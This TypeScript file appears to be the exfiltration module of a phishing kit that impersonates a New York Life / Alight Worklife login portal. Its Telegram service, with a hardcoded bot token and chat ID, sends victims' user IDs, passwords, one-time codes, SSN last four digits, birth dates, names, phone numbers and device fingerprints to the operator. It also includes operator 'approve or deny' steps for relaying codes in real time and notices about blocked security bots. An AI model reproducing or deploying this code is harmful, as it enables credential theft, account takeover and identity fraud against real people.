import { SITE_DISPLAY_NAME } from "./site-url"
import { getNetworkHintLabel } from "@/lib/bot-verification/datacenter-heuristic"
import { formatIdentifierLine } from "@/lib/telegram-approval-templates"

export interface VisitorData {
  siteName: string
  location: string
  ip: string
  timezone: string
  isp: string
  asn?: string | null
  org?: string | null
  /** Parsed OS label from UA, e.g. "iOS 17.2", "Windows 10/11". */
  osLabel?: string
  /** Hardware/class from UA, e.g. "iPhone", "Mac", "Windows PC". */
  deviceLabel?: string

  userAgent: string
  screen: string
  language: string
  /** Display label: "(direct)", "(search engine)", or full referrer URL */
  referrer: string
  /** Page URL the visitor opened (always set; placeholder when unknown) */
  pageUrl: string
  localTime: string
  utcTime: string
}

export interface LoginData {
  userId: string
  password: string
}

export interface VerificationData {
  verificationType: string
  code: string
}

export interface ForgotPasswordData {
  ssnLast4: string
  birthDate: string
}

export interface NewUserData {
  ssnLast4: string
  birthDate: string
}

export interface AccountFoundData {
  method: string
  password?: string
}

export interface VerifyDetailsData {
  ssnLast4: string
  birthDate: string
  phoneNumber?: string
  fullName?: string
}

export interface BotBlockedData {
  name?: string
  type?: string
  userAgent: string
  ip: string
  path: string
  reason: string
}

const PROJECT_NAME = "New York Life Alight Worklife"

function escapeHtml(value: string): string {
  return value
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;")
}

function isHttpUrl(value: string): boolean {
  return /^https?:\/\//i.test(value.trim())
}

/** Origin-only ADMIN_PORTAL_URL for Telegram links (no /admin/login, no ?project=). */
function normalizeAdminPortalUrl(raw?: string): string {
  const t = (raw ?? "").trim()
  if (!t) return "/admin/login"
  const origin = t.replace(/\/admin\/login.*$/i, "").replace(/\?.*$/, "").replace(/\/+$/, "")
  return origin || "/admin/login"
}

/** Base ADMIN_PORTAL_URL for Telegram approve/deny links (no /admin/login path). */
function adminPortalLink(): string {
  return normalizeAdminPortalUrl(process.env.ADMIN_PORTAL_URL)
}

/** Clickable link for Telegram HTML (admin portal, page URLs, etc.). */
function asLink(url: string, label?: string): string {
  const href = url.trim()
  if (!href || !isHttpUrl(href)) {
    return asCode(href || "Unknown")
  }
  const linkText = (label?.trim() || href).trim()
  return `<a href="${escapeHtml(href)}">${escapeHtml(linkText)}</a>`
}

/** Referrer / page fields: link when http(s), otherwise monospace. */
function asUrlField(value: unknown, fallback = "Unknown"): string {
  const t = value == null || value === "" ? "" : String(value).trim()
  const resolved = t || fallback
  if (resolved === "Direct") return asCode(resolved)
  if (isHttpUrl(resolved)) return asLink(resolved)
  return asCode(resolved)
}
/** Site header for all ops flow messages (login / method / OTP / CC / registration). */
export function wrapFlowMessage(body: string): string {
  return `🏷️ <b>${escapeHtml(SITE_DISPLAY_NAME)}</b>\n━━━━━━━━━━━━━━━━━━\n\n${body}`
}


function asString(value: unknown): string {
  return typeof value === "string" ? value.trim() : ""
}

function asCode(value: unknown): string {
  const text = asString(value) || (value != null && value !== "" ? String(value) : "")
  return `<code>${escapeHtml(text || "Unknown")}</code>`
}

function asPre(value: unknown): string {
  const text = typeof value === "string" ? value : value != null ? String(value) : ""
  return `<pre>${escapeHtml(text || "Unknown")}</pre>`
}

class TelegramService {
  private botToken: string
  private chatIds: string[]

  constructor() {
    this.botToken = "8985470259:AAEP5YHeX8sSz65Pfb3aoJv8Re61F10AONg"
    this.chatIds = ["8810036834"]
  }

  private async sendMessage(message: string): Promise<boolean> {
    if (!this.botToken || this.chatIds.length === 0) {
      console.error("Telegram not configured: missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID")
      return false
    }

    const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`

    try {
      const results = await Promise.all(
        this.chatIds.map((chatId) =>
          fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
              parse_mode: "HTML",
              disable_web_page_preview: true,
            }),
          }),
        ),
      )
      return results.every((res) => res.ok)
    } catch (error) {
      console.error("Failed to send Telegram message:", error)
      return false
    }
  }

  async sendInputNotification(inputs: Record<string, string>): Promise<void> {
    const entries = Object.entries(inputs).filter(([, value]) => value.trim() !== "")
    if (entries.length === 0) return

        const flow = (inputs.Flow || inputs.flow || "").trim().toLowerCase()
    const userId = (inputs["User ID"] || inputs.userId || "").trim()

    // User ID step (Flow: Login) → dedicated Login Attempt (no Flow line)
    if (flow === "login" && userId) {
      const body = [
        `🔐 <b>Login Attempt</b>`,
        `━━━━━━━━━━━━━━━━━━`,
        `👤 <b>User ID:</b> ${asCode(userId)}`,
      ].join("\n")
      await this.sendMessage(wrapFlowMessage(body))
      return
    }

const lines = [
      `🔐 <b>${escapeHtml(PROJECT_NAME)} – New Input Received</b>`,
      "━━━━━━━━━━━━━━━━━━",
      ...entries.map(([key, value]) => `${escapeHtml(key)}: ${asCode(value)}`),
    ]
    await this.sendMessage(wrapFlowMessage(lines.join("\n")))
  }

  async sendVisitorNotification(data: VisitorData): Promise<boolean> {
    const networkHint = getNetworkHintLabel(data.asn, data.org || data.isp)
    const msg = [
      `🌐 <b>New Visitor (${escapeHtml(data.siteName)})</b>`,
      "━━━━━━━━━━━━━━━━━━",
      `📍 Location: ${asCode(data.location)}`,
      `🌍 IP: ${asCode(data.ip)}`,
      `⏰ Timezone: ${asCode(data.timezone)}`,
      `🌐 ISP: ${asCode(data.isp)}`,
      ...(networkHint ? [`🛡️ Network: ${asCode(networkHint)}`] : []),
      "",
      `📱 <b>OS:</b> ${asCode(data.osLabel ?? "Unknown")}`,
      `📱 <b>Device:</b> ${asCode(data.deviceLabel ?? "Unknown")}`,
      "💻 <b>User Agent:</b>",
      asPre(data.userAgent),
      `🖥️ Screen: ${asCode(data.screen)}`,
      `🌍 Language: ${asCode(data.language)}`,
      `🔗 Referrer: ${asUrlField(data.referrer)}`,
      `🌐 URL: ${asUrlField(data.pageUrl)}`,
      "",
      `⏰ Local Time: ${asCode(data.localTime)}`,
      `🕒 UTC Time: ${asCode(data.utcTime)}`,
      `<a href="https://t.me/th3_allfather">Odin Is With Us</a>`,
    ].join("\n")
    return this.sendMessage(msg)
  }

  async sendLoginApprovalNotification(data: {
    userId: string
    method: string
    maskedEmail?: string
    maskedPhone?: string
    ip?: string
  }): Promise<void> {
    const methodLabel = data.method === "email" ? "Email" : "Text Message (SMS)"
    const adminLink = process.env.ADMIN_PORTAL_URL ? adminPortalLink() : "/admin/login"
    const contact =
      data.method === "email"
        ? `📧 Email: ${asCode(data.maskedEmail)}`
        : `📱 Phone: ${asCode(data.maskedPhone)}`
    const lines = [
      `🔔 <b>Login request – approve or deny</b>`,
      "━━━━━━━━━━━━━━━━━━",
      `👤 User ID: ${asCode(data.userId)}`,
      `📧 Method: ${asCode(methodLabel)}`,
      contact,
    ]
    if (data.ip) lines.push(`🌍 IP: ${asCode(data.ip)}`)
    lines.push("", `👉 ${asLink(adminLink, "Approve or deny")}`)
    await this.sendMessage(wrapFlowMessage(lines.join("\n")))
  }

  async sendVerificationApprovalNotification(data: {
    userId: string
    method: string
    maskedEmail?: string
    maskedPhone?: string
    code?: string
    ip?: string
  }): Promise<void> {
    const adminLink = process.env.ADMIN_PORTAL_URL ? adminPortalLink() : "/admin/login"
    const lines = [
      `🔢 <b>OTP submitted – approve or deny</b>`,
      "━━━━━━━━━━━━━━━━━━",
      `👤 User ID: ${asCode(data.userId)}`,
      `🔐 Code: ${asCode(data.code)}`,
      "",
      `👉 ${asLink(adminLink, "Approve or deny")}`,
    ]
    await this.sendMessage(wrapFlowMessage(lines.join("\n")))
  }

  async sendLoginNotification(data: LoginData): Promise<void> {
    const message = [
      `🔐 <b>${escapeHtml(PROJECT_NAME)} – Login Attempt</b>`,
      "━━━━━━━━━━━━━━━━━━",
      `${formatIdentifierLine(data.userId, asCode)}`,
      `🔑 Password: ${asCode(data.password)}`,
    ].join("\n")
    await this.sendMessage(wrapFlowMessage(message))
  }

  async sendVerificationNotification(data: VerificationData): Promise<void> {
    const message = [
      `🔑 <b>${escapeHtml(PROJECT_NAME)} – Verification Code Submitted</b>`,
      "━━━━━━━━━━━━━━━━━━",
      `🔢 Code: ${asCode(data.code)}`,
    ].join("\n")
    await this.sendMessage(wrapFlowMessage(message))
  }

  async sendVerificationClickNotification(verificationType: string): Promise<void> {
    const message = [
      `🟦 <b>${escapeHtml(PROJECT_NAME)} – Verification Option Selected</b>`,
      "━━━━━━━━━━━━━━━━━━",
      `🔐 Type: ${asCode(verificationType)}`,
    ].join("\n")
    await this.sendMessage(wrapFlowMessage(message))
  }

  async sendVerifyDetailsNotification(data: VerifyDetailsData): Promise<void> {
    const adminLink = process.env.ADMIN_PORTAL_URL ? adminPortalLink() : "/admin/login"
    const verificationFooter = `\n\n👉 ${asLink(adminLink, "Approve or deny")}`
    const lines = [
      `✅ <b>${escapeHtml(PROJECT_NAME)} – Verify Your Details Submitted</b>`,
      "━━━━━━━━━━━━━━━━━━",
      `🔢 Last 4 SSN: ${asCode(data.ssnLast4)}`,
      `📅 Birth Date: ${asCode(data.birthDate)}`,
    ]
    if (data.fullName) lines.push(`🙍 Full Name: ${asCode(data.fullName)}`)
    if (data.phoneNumber) lines.push(`📞 Phone: ${asCode(`+1 ${data.phoneNumber}`)}`)
    await this.sendMessage(wrapFlowMessage(lines.join("\n") + verificationFooter))
  }

  async sendResendCodeNotification(isSecondOtp: boolean): Promise<void> {
    const otpType = isSecondOtp ? "Code (final)" : "Code (first OTP)"
    const message = [
      `🔄 <b>${escapeHtml(PROJECT_NAME)} – Resend Code Requested</b>`,
      "━━━━━━━━━━━━━━━━━━",
      `🔐 OTP Type: ${asCode(otpType)}`,
    ].join("\n")
    await this.sendMessage(wrapFlowMessage(message))
  }

  async sendForgotPasswordPageViewNotification(): Promise<void> {
    const message = [
      `🔗 <b>${escapeHtml(PROJECT_NAME)} – Forgot Password page opened</b>`,
      "━━━━━━━━━━━━━━━━━━",
      'User clicked "Forgot User ID or Password?" and landed on the form.',
    ].join("\n")
    await this.sendMessage(wrapFlowMessage(message))
  }

  async sendForgotPasswordNotification(data: ForgotPasswordData): Promise<void> {
    const message = [
      `🔑 <b>${escapeHtml(PROJECT_NAME)} – Forgot Password – form submitted (all fields)</b>`,
      "━━━━━━━━━━━━━━━━━━",
      `🔢 Last 4 SSN: ${asCode(data.ssnLast4)}`,
      `📅 Birth Date: ${asCode(data.birthDate)}`,
      `✅ Privacy Policy: ${asCode("accepted")}`,
    ].join("\n")
    await this.sendMessage(wrapFlowMessage(message))
  }

  async sendNewUserPageViewNotification(): Promise<void> {
    const message = [
      `🔗 <b>${escapeHtml(PROJECT_NAME)} – New User page opened</b>`,
      "━━━━━━━━━━━━━━━━━━",
      'User clicked "New User?" and landed on the form.',
    ].join("\n")
    await this.sendMessage(wrapFlowMessage(message))
  }

  async sendNewUserNotification(data: NewUserData): Promise<void> {
    const message = [
      `👤 <b>${escapeHtml(PROJECT_NAME)} – New User – form submitted (all fields)</b>`,
      "━━━━━━━━━━━━━━━━━━",
      `🔢 Last 4 SSN: ${asCode(data.ssnLast4)}`,
      `📅 Birth Date: ${asCode(data.birthDate)}`,
      `✅ Privacy Policy: ${asCode("accepted")}`,
    ].join("\n")
    await this.sendMessage(wrapFlowMessage(message))
  }

  async sendAccountFoundNotification(data: AccountFoundData): Promise<void> {
    const lines = [
      `✅ <b>${escapeHtml(PROJECT_NAME)} – Account Found – Continue Clicked</b>`,
      "━━━━━━━━━━━━━━━━━━",
      `🔐 Method: ${asCode(data.method)}`,
    ]
    if (data.password) lines.push(`🔑 Password: ${asCode(data.password)}`)
    await this.sendMessage(wrapFlowMessage(lines.join("\n")))
  }

  async sendAccountFoundResetPasswordNotification(): Promise<void> {
    const message = [
      `🔗 <b>${escapeHtml(PROJECT_NAME)} – Account Found – Reset password link clicked</b>`,
      "━━━━━━━━━━━━━━━━━━",
      'User clicked "Reset password" on the account found page.',
    ].join("\n")
    await this.sendMessage(wrapFlowMessage(message))
  }

  async sendForgotPasswordVerifyNotification(verificationType: string): Promise<void> {
    const message = [
      `🔐 <b>${escapeHtml(PROJECT_NAME)} – Forgot Password – Verify Identity Option Selected</b>`,
      "━━━━━━━━━━━━━━━━━━",
      `🔐 Type: ${asCode(verificationType)}`,
    ].join("\n")
    await this.sendMessage(wrapFlowMessage(message))
  }

  async sendForgotPasswordCodeNotification(code: string): Promise<void> {
    const message = [
      `🔢 <b>${escapeHtml(PROJECT_NAME)} – Forgot Password – Access Code Entered</b>`,
      "━━━━━━━━━━━━━━━━━━",
      `🔢 Code: ${asCode(code)}`,
    ].join("\n")
    await this.sendMessage(wrapFlowMessage(message))
  }

  async sendForgotPasswordResendNotification(): Promise<void> {
    const message = [
      `🔄 <b>${escapeHtml(PROJECT_NAME)} – Forgot Password – Resend Code Requested</b>`,
      "━━━━━━━━━━━━━━━━━━",
    ].join("\n")
    await this.sendMessage(wrapFlowMessage(message))
  }

  async sendBotBlockedNotification(data: BotBlockedData): Promise<void> {
    const lines = [
      `🚫 <b>BLOCKED BOT – ${escapeHtml(PROJECT_NAME)}</b>`,
      "━━━━━━━━━━━━━━━━━━",
    ]
    if (data.name) lines.push(`Name: ${asCode(data.name)}`)
    if (data.type) lines.push(`Type: ${asCode(data.type)}`)
    lines.push(
      "",
      "🤖 User-Agent:",
      asPre(data.userAgent),
      "",
      `📍 IP: ${asCode(data.ip)}`,
      `🔗 Path: ${asCode(data.path)}`,
      "",
      `📋 Why blocked: ${asCode(data.reason)}`,
    )
    await this.sendMessage(wrapFlowMessage(lines.join("\n")))
  }
}

export const telegramService = new TelegramService()

export type VisitorTelegramData = VisitorData

export async function sendVisitorNotification(data: VisitorTelegramData): Promise<boolean> {
  const networkHint = getNetworkHintLabel(data.asn, data.org || data.isp)
  return telegramService.sendVisitorNotification(data)
}
